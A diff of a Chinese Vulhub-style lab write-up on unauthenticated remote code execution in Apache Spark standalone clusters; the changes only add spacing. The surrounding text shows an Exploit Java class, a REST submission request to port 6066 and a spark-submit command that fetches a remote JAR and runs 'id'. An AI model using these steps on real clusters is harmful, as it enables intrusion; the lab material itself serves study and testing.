@@ -2,7 +2,7 @@
 
 ## 漏洞描述
 
-Apache Spark是一款集群计算系统，其支持用户向管理节点提交应用，并分发给集群执行。如果管理节点未启动ACL（访问控制），我们将可以在集群中执行任意代码。
+Apache Spark 是一款集群计算系统，其支持用户向管理节点提交应用，并分发给集群执行。如果管理节点未启动 ACL（访问控制），我们将可以在集群中执行任意代码。
 
 参考链接：
 
@@ -23,13 +23,13 @@ app="APACHE-Spark-Jobs"
 
 ## 环境搭建
 
-Vulhub执行如下命令，将以standalone模式启动一个Apache Spark集群，集群里有一个master与一个slave：
+Vulhub 执行如下命令，将以 standalone 模式启动一个 Apache Spark 集群，集群里有一个 master 与一个 slave：
 
 ```
 docker-compose up -d
 ```
 
-环境启动后，访问`http://your-ip:8080`即可看到master的管理页面，访问`http://your-ip:8081`即可看到slave的管理页面。
+环境启动后，访问 `http://your-ip:8080` 即可看到 master 的管理页面，访问 `http://your-ip:8081` 即可看到 slave 的管理页面。
 
 ## 漏洞利用
 
@@ -37,10 +37,10 @@ docker-compose up -d
 
 提交方式有两种：
 
-1. 利用REST API
-2. 利用submissions网关（集成在7077端口中）
+1. 利用 REST API
+2. 利用 submissions 网关（集成在 7077 端口中）
 
-应用可以是Java或Python，就是一个最简单的类，如（参考链接1）：
+应用可以是 Java 或 Python，就是一个最简单的类，如（参考链接 1）：
 
 ```java
 import java.io.BufferedReader;
@@ -79,11 +79,11 @@ public class Exploit {
 }
 ```
 
-将其编译成JAR，放在任意一个HTTP或FTP上，如`https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar`。
+将其编译成 JAR，放在任意一个 HTTP 或 FTP 上，如 `https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar`。
 
-### 用REST API方式提交应用
+### 用 REST API 方式提交应用
 
-standalone模式下，master将在6066端口启动一个HTTP服务器，我们向这个端口提交REST格式的API：
+standalone 模式下，master 将在 6066 端口启动一个 HTTP 服务器，我们向这个端口提交 REST 格式的 API：
 
 ```
 POST /v1/submissions/create HTTP/1.1
@@ -118,26 +118,26 @@ Content-Length: 680
 }
 ```
 
-其中，`spark.jars`即是编译好的应用，mainClass是待运行的类，appArgs是传给应用的参数。
+其中，`spark.jars` 即是编译好的应用，mainClass 是待运行的类，appArgs 是传给应用的参数。
 
 ![img](images/1-16818019181141.png)
 
-返回的包中有submissionId，然后访问`http://your-ip:8081/logPage/?driverId={submissionId}&logType=stdout`，即可查看执行结果：
+返回的包中有 submissionId，然后访问 `http://your-ip:8081/logPage/?driverId={submissionId}&logType=stdout`，即可查看执行结果：
 
 ![img](images/2-16818019181143.png)
 
-注意，提交应用是在master中，查看结果是在具体执行这个应用的slave里（默认8081端口）。实战中，由于slave可能有多个。
+注意，提交应用是在 master 中，查看结果是在具体执行这个应用的 slave 里（默认 8081 端口）。实战中，由于 slave 可能有多个。
 
-### 利用submissions网关
+### 利用 submissions 网关
 
-如果6066端口不能访问，或做了权限控制，我们可以利用master的主端口7077，来提交应用。
+如果 6066 端口不能访问，或做了权限控制，我们可以利用 master 的主端口 7077，来提交应用。
 
-方法是利用Apache Spark自带的脚本`bin/spark-submit`：
+方法是利用 Apache Spark 自带的脚本 `bin/spark-submit`：
 
 ```
 bin/spark-submit --master spark://your-ip:7077 --deploy-mode cluster --class Exploit https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar id
 ```
 
-如果你指定的master参数是rest服务器，这个脚本会先尝试使用rest api来提交应用；如果发现不是rest服务器，则会降级到使用submission gateway来提交应用。
+如果你指定的 master 参数是 rest 服务器，这个脚本会先尝试使用 rest api 来提交应用；如果发现不是 rest 服务器，则会降级到使用 submission gateway 来提交应用。
 
 查看结果的方式与前面一致。
